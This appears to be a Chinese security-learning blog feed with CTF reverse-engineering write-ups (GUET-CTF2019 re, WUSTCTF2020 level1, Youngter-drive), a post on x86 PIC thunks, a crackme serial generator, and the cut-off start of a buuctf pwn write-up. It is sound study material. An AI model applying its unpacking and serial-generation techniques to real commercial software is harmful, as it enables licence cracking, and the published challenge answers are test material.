头即可。A换成N、B换成O、依此类推到M换成Z，然后序列反转：N换成A、O换成B、最后Z换成M。只有这些出现在英文字母里头的字元受影响；数字、符 号、空白字元以及所有其他字元都不变。因为只有在英文字母表里头只有26个，并且26=2×13，ROT13函数是它自己的逆反： [1] </p></blockquote><p>对任何字元x：ROT13(ROT13(x))=ROT26(x)=x。<br>直接找个在线解密工具梭出来也可以</p><h2 id="4-GUET-CTF2019-re"><a href="#4-GUET-CTF2019-re" class="headerlink" title="4.[GUET-CTF2019]re"></a>4.[GUET-CTF2019]re</h2><p>是个ELF文件，先checksec一下<br><img src="https://i.loli.net/2021/04/10/oJTznurCURtXE5N.png" alt=""><br>发现存在UPX壳<br>直接用工具脱壳<br><code>./upx -d ./re</code><br>然后进入ida分析，核心逻辑很简单，求出每一位flag然后转换成字符就可以，但是有坑点<br><img src="https://i.loli.net/2021/04/10/6rUJXYEoli1egf5.png" alt=""></p><p>一开始是想逐步求解的，但是发现这也太反人类了，直接用正则提取吧<br>脚本如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">flag = [</span><br><span class="line"><span class="number">166163712</span>//<span class="number">1629056</span></span><br><span class="line">,<span class="number">731332800</span>//<span class="number">6771600</span></span><br><span class="line">,<span class="number">357245568</span>//<span class="number">3682944</span></span><br><span class="line">,<span class="number">1074393000</span>//<span class="number">10431000</span></span><br><span class="line">,<span class="number">489211344</span>//<span class="number">3977328</span></span><br><span class="line">,<span class="number">518971936</span>//<span class="number">5138336</span></span><br><span class="line">,<span class="number">406741500</span>//<span class="number">7532250</span></span><br><span class="line">,<span class="number">294236496</span>//<span class="number">5551632</span></span><br><span class="line">,<span class="number">177305856</span>//<span class="number">3409728</span></span><br><span class="line">,<span class="number">650683500</span>//<span class="number">13013670</span></span><br><span class="line">,<span class="number">298351053</span>//<span class="number">6088797</span></span><br><span class="line">,<span class="number">386348487</span>//<span class="number">7884663</span></span><br><span class="line">,<span class="number">438258597</span>//<span class="number">8944053</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">text = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">  if ( 5198490 * flag[14] != 249527520 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 4544518 * flag[15] != 445362764 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 3645600 * flag[17] != 174988800 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 10115280 * flag[16] != 981182160 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 9667504 * flag[18] != 493042704 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 5364450 * flag[19] != 257493600 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 13464540 * flag[20] != 767478780 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 5488432 * flag[21] != 312840624 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 14479500 * flag[22] != 1404511500 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 6451830 * flag[23] != 316139670 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 6252576 * flag[24] != 619005024 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 7763364 * flag[25] != 372641472 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 7327320 * flag[26] != 373693320 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 8741520 * flag[27] != 498266640 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 8871876 * flag[28] != 452465676 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 4086720 * flag[29] != 208422720 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 9374400 * flag[30] == 515592000 )</span></span><br><span class="line"><span class="string">    return 5759124 * flag[31] == 719890500;</span></span><br><span class="line"><span class="string">  return 0LL;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 匹配至少三次数字才有效</span></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;\d&#123;3,&#125;&#x27;</span>)</span><br><span class="line">flagRe = pattern.findall(text)</span><br><span class="line">print(flagRe)</span><br><span class="line"></span><br><span class="line">smallList = []</span><br><span class="line">bigList = []</span><br><span class="line">flagAppend = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(flagRe),<span class="number">2</span>):</span><br><span class="line">    smallList.append(<span class="built_in">int</span>(flagRe[i]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(flagRe),<span class="number">2</span>):</span><br><span class="line">    bigList.append(<span class="built_in">int</span>(flagRe[i]))</span><br><span class="line"></span><br><span class="line">print(<span class="built_in">len</span>(smallList))</span><br><span class="line">print(<span class="built_in">len</span>(bigList))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(smallList)):</span><br><span class="line">    flagAppend.append(bigList[i] // smallList[i])</span><br><span class="line"></span><br><span class="line">print(flagAppend)</span><br><span class="line"></span><br><span class="line">flag = flag + flagAppend</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    flag[i] = <span class="built_in">chr</span>(flag[i])</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;&quot;</span>.join(flag))</span><br></pre></td></tr></table></figure><p>后来由于这俩坑点就怎么交也不对，搜了师傅们的wp才发现…<br>还有一种解法就是用z3约束器来解（学到了学到了</p><blockquote><p><a href="https://arabelatso.github.io/2018/06/14/Z3%20API%20in%20Python/">https://arabelatso.github.io/2018/06/14/Z3%20API%20in%20Python/</a></p></blockquote><p>用这种方法来解也比较方便，先解出来然后再转ascii码<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = [<span class="number">0</span>] * <span class="number">32</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    flag[i] = Int(<span class="string">&quot;flag[&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;]&quot;</span>)</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">s.add(<span class="number">1629056</span> * flag[<span class="number">0</span>] == <span class="number">166163712</span>)</span><br><span class="line">s.add(<span class="number">6771600</span> * flag[<span class="number">1</span>] == <span class="number">731332800</span>)</span><br><span class="line">s.add(<span class="number">3682944</span> * flag[<span class="number">2</span>] == <span class="number">357245568</span>)</span><br><span class="line">s.add(<span class="number">10431000</span> * flag[<span class="number">3</span>] == <span class="number">1074393000</span>)</span><br><span class="line">s.add(<span class="number">3977328</span> * flag[<span class="number">4</span>] == <span class="number">489211344</span>)</span><br><span class="line">s.add(<span class="number">5138336</span> * flag[<span class="number">5</span>] == <span class="number">518971936</span>)</span><br><span class="line">s.add(<span class="number">7532250</span> * flag[<span class="number">7</span>] == <span class="number">406741500</span>)</span><br><span class="line">s.add(<span class="number">5551632</span> * flag[<span class="number">8</span>] == <span class="number">294236496</span>)</span><br><span class="line">s.add(<span class="number">3409728</span> * flag[<span class="number">9</span>] == <span class="number">177305856</span>)</span><br><span class="line">s.add(<span class="number">13013670</span> * flag[<span class="number">10</span>] == <span class="number">650683500</span>)</span><br><span class="line">s.add(<span class="number">6088797</span> * flag[<span class="number">11</span>] == <span class="number">298351053</span>)</span><br><span class="line">s.add(<span class="number">7884663</span> * flag[<span class="number">12</span>] == <span class="number">386348487</span>)</span><br><span class="line">s.add(<span class="number">8944053</span> * flag[<span class="number">13</span>] == <span class="number">438258597</span>)</span><br><span class="line">s.add(<span class="number">5198490</span> * flag[<span class="number">14</span>] == <span class="number">249527520</span>)</span><br><span class="line">s.add(<span class="number">4544518</span> * flag[<span class="number">15</span>] == <span class="number">445362764</span>)</span><br><span class="line">s.add(<span class="number">3645600</span> * flag[<span class="number">17</span>] == <span class="number">174988800</span>)</span><br><span class="line">s.add(<span class="number">10115280</span> * flag[<span class="number">16</span>] == <span class="number">981182160</span>)</span><br><span class="line">s.add(<span class="number">9667504</span> * flag[<span class="number">18</span>] == <span class="number">493042704</span>)</span><br><span class="line">s.add(<span class="number">5364450</span> * flag[<span class="number">19</span>] == <span class="number">257493600</span>)</span><br><span class="line">s.add(<span class="number">13464540</span> * flag[<span class="number">20</span>] == <span class="number">767478780</span>)</span><br><span class="line">s.add(<span class="number">5488432</span> * flag[<span class="number">21</span>] == <span class="number">312840624</span>)</span><br><span class="line">s.add(<span class="number">14479500</span> * flag[<span class="number">22</span>] == <span class="number">1404511500</span>)</span><br><span class="line">s.add(<span class="number">6451830</span> * flag[<span class="number">23</span>] == <span class="number">316139670</span>)</span><br><span class="line">s.add(<span class="number">6252576</span> * flag[<span class="number">24</span>] == <span class="number">619005024</span>)</span><br><span class="line">s.add(<span class="number">7763364</span> * flag[<span class="number">25</span>] == <span class="number">372641472</span>)</span><br><span class="line">s.add(<span class="number">7327320</span> * flag[<span class="number">26</span>] == <span class="number">373693320</span>)</span><br><span class="line">s.add(<span class="number">8741520</span> * flag[<span class="number">27</span>] == <span class="number">498266640</span>)</span><br><span class="line">s.add(<span class="number">8871876</span> * flag[<span class="number">28</span>] == <span class="number">452465676</span>)</span><br><span class="line">s.add(<span class="number">4086720</span> * flag[<span class="number">29</span>] == <span class="number">208422720</span>)</span><br><span class="line">s.add(<span class="number">9374400</span> * flag[<span class="number">30</span>] == <span class="number">515592000</span>)</span><br><span class="line">s.add(<span class="number">5759124</span> * flag[<span class="number">31</span>] == <span class="number">719890500</span>)</span><br><span class="line"></span><br><span class="line">print(s.check())</span><br><span class="line">print(s.model())</span><br></pre></td></tr></table></figure></p><h2 id="5-WUSTCTF2020-level1"><a href="#5-WUSTCTF2020-level1" class="headerlink" title="5.[WUSTCTF2020]level1"></a>5.[WUSTCTF2020]level1</h2><p>源码和逻辑都很简单，对flag进行加密，然后还给了output文件，应该就是flag加密后的输出结果<br><img src="https://i.loli.net/2021/04/10/lTe58pKU7iIGdRz.png" alt=""></p><p>写个解密脚本就行了（1，3，5，7…与1相与为1）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flagReverse = [</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">198</span>,</span><br><span class="line">    <span class="number">232</span>,</span><br><span class="line">    <span class="number">816</span>,</span><br><span class="line">    <span class="number">200</span>,</span><br><span class="line">    <span class="number">1536</span>,</span><br><span class="line">    <span class="number">300</span>,</span><br><span class="line">    <span class="number">6144</span>,</span><br><span class="line">    <span class="number">984</span>,</span><br><span class="line">    <span class="number">51200</span>,</span><br><span class="line">    <span class="number">570</span>,</span><br><span class="line">    <span class="number">92160</span>,</span><br><span class="line">    <span class="number">1200</span>,</span><br><span class="line">    <span class="number">565248</span>,</span><br><span class="line">    <span class="number">756</span>,</span><br><span class="line">    <span class="number">1474560</span>,</span><br><span class="line">    <span class="number">800</span>,</span><br><span class="line">    <span class="number">6291456</span>,</span><br><span class="line">    <span class="number">1782</span>,</span><br><span class="line">    <span class="number">65536000</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(flagReverse)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        flagReverse[i] = flagReverse[i] &gt;&gt; i</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flagReverse[i] = flagReverse[i] // i</span><br><span class="line"></span><br><span class="line">    flagReverse[i] = <span class="built_in">chr</span>(flagReverse[i])</span><br><span class="line"></span><br><span class="line">flag = flagReverse[<span class="number">1</span>:]</span><br><span class="line">print(<span class="string">&quot;&quot;</span>.join(flag))</span><br></pre></td></tr></table></figure><h2 id="6-Youngter-drive"><a href="#6-Youngter-drive" class="headerlink" title="6.Youngter-drive"></a>6.Youngter-drive</h2><blockquote><p>UPX脱壳:<a href="https://github.com/upx/upx/releases">https://github.com/upx/upx/releases</a></p></blockquote><p>先去个壳<br><img src="https://i.loli.net/2021/04/11/cGXKI38bUisLfzJ.png" alt=""></p><p>main函数中启动了两个子线程<br><img src="https://i.loli.net/2021/04/11/rgxAZITfhmq1ozW.png" alt=""></p><p>第一个线程对于我们输入的flag进行替换<br><img src="https://i.loli.net/2021/04/11/ZTrNDyLRgpScUB9.png" alt=""></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// positive sp value has been detected, the output may be wrong!</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *__cdecl <span class="title">sub_411940</span><span class="params">(<span class="keyword">int</span> source, <span class="keyword">int</span> target_in_data_1d)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [esp+D3h] [ebp-5h]</span></span><br><span class="line"></span><br><span class="line">  v3 = *(_BYTE *)(target_in_data_1d + source);</span><br><span class="line">  <span class="keyword">if</span> ( (v3 &lt; <span class="number">97</span> || v3 &gt; <span class="number">122</span>) &amp;&amp; (v3 &lt; <span class="number">65</span> || v3 &gt; <span class="number">90</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="string">&#x27;a&#x27;</span> || v3 &gt; <span class="string">&#x27;z&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = off_418000[<span class="number">0</span>];</span><br><span class="line">    <span class="comment">// 大写字母 - 38，即27-52</span></span><br><span class="line">    *(_BYTE *)(target_in_data_1d + source) = off_418000[<span class="number">0</span>][*(<span class="keyword">char</span> *)(target_in_data_1d + source) - <span class="number">38</span>];</span><br><span class="line">    <span class="comment">// 将索引映射到另外一张表进行替换</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = off_418000[<span class="number">0</span>];</span><br><span class="line">    <span class="comment">// 小写字母 - 96，即1 - 26</span></span><br><span class="line">    *(_BYTE *)(target_in_data_1d + source) = off_418000[<span class="number">0</span>][*(<span class="keyword">char</span> *)(target_in_data_1d + source) - <span class="number">96</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二个线程只是减去data段的一个计数器，并没有对我们输入的字符串进行操作，所以坑点1就是在我们输入的字符串中，只有偶数位（0，1，3,…29）被进行替换了<br>替换逻辑比较简单，见上面贴的注释</p><p>坑点2就是最后check的时候只检查了29位，最后一位搜的wp是填E（好像在安恒赛的时候填啥都对，然后看了一个师傅的wp觉得应该填Z，因为映射回来正好是NULL<br><img src="https://i.loli.net/2021/04/11/d4vbaU7eFPiVZwx.png" alt=""></p><p>脚本如下：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = <span class="string">&quot;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&quot;</span></span><br><span class="line">flagRe = <span class="string">&quot;TOiZiZtOrYaToUwPnToBsOaOapsySa&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"> v3 = *(_BYTE *)(target_in_data_1d + source);</span></span><br><span class="line"><span class="string">  if ( (v3 &lt; 97 || v3 &gt; 122) &amp;&amp; (v3 &lt; 65 || v3 &gt; 90) )</span></span><br><span class="line"><span class="string">    exit(0);</span></span><br><span class="line"><span class="string">  if ( v3 &lt; &#x27;a&#x27; || v3 &gt; &#x27;z&#x27; )</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    result = off_418000[0];</span></span><br><span class="line"><span class="string">    *(_BYTE *)(target_in_data_1d + source) = off_418000[0][*(char *)(target_in_data_1d + source) - &#x27;&amp;&#x27;];</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    result = off_418000[0];</span></span><br><span class="line"><span class="string">    *(_BYTE *)(target_in_data_1d + source) = off_418000[0][*(char *)(target_in_data_1d + source) - &#x27;`&#x27;];</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"></span><br><span class="line">i = <span class="number">0x1d</span></span><br><span class="line"><span class="keyword">while</span> i &gt; -<span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span> key.find(flagRe[i]):</span><br><span class="line">        position = key.find(flagRe[i])</span><br><span class="line">        <span class="keyword">if</span> position &lt;= <span class="number">26</span>:</span><br><span class="line">            flag.append(<span class="built_in">chr</span>(position + <span class="number">96</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag.append(<span class="built_in">chr</span>(position + <span class="number">38</span>))</span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">    flag.append(flagRe[i])</span><br><span class="line">    i -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">reversed</span>(flag)</span><br><span class="line">print(<span class="string">&quot;&quot;</span>.join(flag))</span><br><span class="line">print(<span class="built_in">len</span>(flag))</span><br></pre></td></tr></table></figure></p><p>大师傅的wp，详细解释了这个程序中反调试的部分，值得阅读:<a href="https://hx1997.github.io/2018/07/22/anheng-july-re-youngter-drive/">https://hx1997.github.io/2018/07/22/anheng-july-re-youngter-drive/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> -reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>__x86.get_pc_thunk.ax函数</title>
      <link href="2021/04/06/ax/"/>
      <url>2021/04/06/ax/</url>
      
        <content type="html"><![CDATA[<h2 id="x86-get-pc-thunk"><a href="#x86-get-pc-thunk" class="headerlink" title="__x86.get_pc_thunk"></a>__x86.get_pc_thunk</h2><p>c语言到汇编指令这篇博文中，我一开始通过gcc编译源文件，没有关闭地址随机化这个选项，在编译出的程序的反汇编中，发现了很奇怪的call指令<br>源程序</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">long</span> x = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">char</span> c = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">23</span>;</span><br><span class="line"><span class="keyword">char</span> b = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="keyword">short</span> c = <span class="number">12</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编</p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">0x11ad</span> &lt;main&gt;                           endbr32                                                                                    </span><br><span class="line">│   <span class="number">0x11b1</span> &lt;main+<span class="number">4</span>&gt;                         <span class="keyword">push</span>   <span class="built_in">ebp</span>                                                                                 </span><br><span class="line">│   <span class="number">0x11b2</span> &lt;main+<span class="number">5</span>&gt;                         <span class="keyword">mov</span>    <span class="built_in">ebp</span>,<span class="built_in">esp</span>                                                                             </span><br><span class="line">│   <span class="number">0x11b4</span> &lt;main+<span class="number">7</span>&gt;                         <span class="keyword">sub</span>    <span class="built_in">esp</span>,<span class="number">0x10</span>                                                                            </span><br><span class="line">│   <span class="number">0x11b7</span> &lt;main+<span class="number">10</span>&gt;                        <span class="keyword">call</span>   <span class="number">0x11d9</span> &lt;__x86<span class="number">.</span>get_pc_thunk<span class="number">.</span><span class="built_in">ax</span>&gt;                                                      </span><br><span class="line">│   <span class="number">0x11bc</span> &lt;main+<span class="number">15</span>&gt;                        <span class="keyword">add</span>    <span class="built_in">eax</span>,<span class="number">0x2e20</span>                                                                          </span><br><span class="line">│   <span class="number">0x11c1</span> &lt;main+<span class="number">20</span>&gt;                        <span class="keyword">mov</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x4</span>],<span class="number">0x17</span>                                                            </span><br><span class="line">│   <span class="number">0x11c8</span> &lt;main+<span class="number">27</span>&gt;                        <span class="keyword">mov</span>    <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x7</span>],<span class="number">0x62</span>                                                             </span><br><span class="line">│   <span class="number">0x11cc</span> &lt;main+<span class="number">31</span>&gt;                        <span class="keyword">mov</span>    <span class="built_in">WORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x6</span>],<span class="number">0xc</span>                                                             </span><br><span class="line">│   <span class="number">0x11d2</span> &lt;main+<span class="number">37</span>&gt;                        <span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x0</span> </span><br><span class="line">│   <span class="number">0x11d7</span> &lt;main+<span class="number">42</span>&gt;                        <span class="keyword">leave</span>                                                                                      </span><br><span class="line">│   <span class="number">0x11d8</span> &lt;main+<span class="number">43</span>&gt;                        <span class="keyword">ret</span>                           </span><br></pre></td></tr></table></figure><p>在main+10的位置处调用了一个__x86.get_pc_thunk.ax，很好奇这个是什么东西，gdb动态调试跟进去看看</p><p><img src="https://i.loli.net/2021/04/06/OD2N7xLbXAhJ5sS.png" style="zoom:50%;" /></p><p>发现了只有两条汇编指令</p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>,[<span class="built_in">esp</span>]</span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure><p>esp存的就是main函数的地址（因为在main函数中call了当前这个函数）</p><p>简单说这个指令就相当于<code>mov eax,eip</code></p><p>这个函数的作用就是get到main函数的地址</p><p>很好奇，为什么要获得main函数的地址呢？</p><p>我们继续往下走</p><p><img src="https://i.loli.net/2021/04/06/2UemXT6PY31hN4B.png" alt="" style="zoom:50%;" /></p><p>发现eax这里通过add一个数字后变成了GOT表的地址，这样就不难理解了（关于什么是GOT表和PLT表，我会后面再展开文章进行学习记录），这个函数在x86上的PIC（position independent code）中使用，用来实现对模块的内部数据进行访问，比如全局变量。我们在main函数中访问一下全局变量x，用gdb查看汇编代码，果然可以看到程序访问x是通过GOT进行的。</p><p><img src="https://i.loli.net/2021/04/06/1QBToDwrjivpK52.png" style="zoom:50%;" /></p><blockquote><p>事实上类似的函数还有：<code>__x86.get_pc_thunk.bx</code>，<code>__x86.get_pc_thunk.cx</code>， <code>__x86.get_pc_thunk.dx</code>。功能是类似的，只不过传入的寄存器分别为<code>%ebx</code>， <code>%ecx</code>， <code>%edx</code>。早期版本的编译器中，这个函数叫<code>__i686.get_pc_thunk.ax</code>。</p></blockquote><h2 id="关闭pie"><a href="#关闭pie" class="headerlink" title="关闭pie"></a>关闭pie</h2><p>使用gcc编译命令</p><p><code>gcc -fno-pie</code></p><p>关闭pie，调试程序发现已经不需要再通过该函数进行寻址了</p><p><img src="https://i.loli.net/2021/04/06/JO6fZ7A2sMKHxzk.png" style="zoom:50%;" /></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><blockquote><p><a href="https://stackoverflow.com/questions/50105581/how-do-i-get-rid-of-call-x86-get-pc-thunk-ax">c - How do i get rid of call    __x86.get_pc_thunk.ax - Stack Overflow</a></p><p><a href="https://qphikk.cn/archives/84">__x86.get_pc_thunk.ax函数</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> -reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>crackme</title>
      <link href="2021/03/23/crackme1/"/>
      <url>2021/03/23/crackme1/</url>
      
        <content type="html"><![CDATA[<h2 id="Peach’s-Crackme"><a href="#Peach’s-Crackme" class="headerlink" title="Peach’s Crackme"></a>Peach’s Crackme</h2><p><img src="https://i.loli.net/2021/03/23/7OH8pcVqwFJzQdS.png" alt="1.png"><br>程序简介，一个简单的注册功能<br><img src="https://i.loli.net/2021/03/23/txOWv6PMi8fRLHA.png" alt="3.png"></p><p>首先x64dbg分析一下，根据程序功能找找字符串啥的<br><img src="https://i.loli.net/2021/03/23/nSVNcGjRhlZF7kK.png" alt="4.png"><br>IDA静态分析，来定位一下地址啥的，然后f5大法直接读伪代码<br><img src="https://i.loli.net/2021/03/23/DZecAmIPGyu4Ftg.png" alt="5.png"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sub_4081C0(<span class="string">&quot;%d\n&quot;</span>, v4);</span><br><span class="line">v5 = sub_401A94(String);</span><br><span class="line"><span class="keyword">if</span> ( v5 == atoi(v7) )</span><br><span class="line">    MessageBoxW(a1, <span class="string">L&quot;You are such a gud boi! Lemme pat you!&quot;</span>, <span class="string">L&quot;Good boi!&quot;</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>最终定位到这个地方<br>主要分析一下v5和v7都是啥，通过ida的万能x引用大法，追踪到一个win32函数，查手册把功能和参数给搞清楚就ok了<br><img src="https://i.loli.net/2021/03/23/q9bHQUNZxaL6gSc.png" alt="2.png"></p><p>最终发现v5是注册时的名字，v7是我们输入的序列号，二者之间通过一个函数来处理，本地运行一下函数就行了，直接出序列号</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+58h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+5Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">char</span> a1[] = <span class="string">&quot;Alex&quot;</span>;</span><br><span class="line">  v3 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1); ++i )</span><br><span class="line">    v3 += a1[i];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="number">431136</span> * v3 - <span class="number">3000</span>) / <span class="number">2</span> - *a1));</span><br><span class="line">&#125;          </span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/23/WFdr8CReqc2Qliu.png" alt="6.png"></p><h2 id="WarGames"><a href="#WarGames" class="headerlink" title="WarGames"></a>WarGames</h2><ul><li>level : 2</li><li>Platform : Unix/linux etc.</li><li>Description : Use ./WarGames pass</li></ul><p>太简单了，把他的算法跑一遍就把结果出来了</p>]]></content>
      
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> crackme </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-pwn系列1</title>
      <link href="2021/03/13/pwn1/"/>
      <url>2021/03/13/pwn1/</url>
      
        <content type="html"><![CDATA[<p>记录下buuctf pwn的write up</p><h2 id="judgement-mna-2016"><a href="#judgement-mna-2016" class="headerlink" title="judgement_mna_2016"></a>judgement_mna_2016</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// esp</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> format; <span class="comment">// [esp+0h] [ebp-4Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+40h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v7; <span class="comment">// [esp+44h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;argc;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v3 = alloca(<span class="number">144</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Flag judgment system\nInput flag &gt;&gt; &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( getnline(&amp;format, <span class="number">0x40</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span 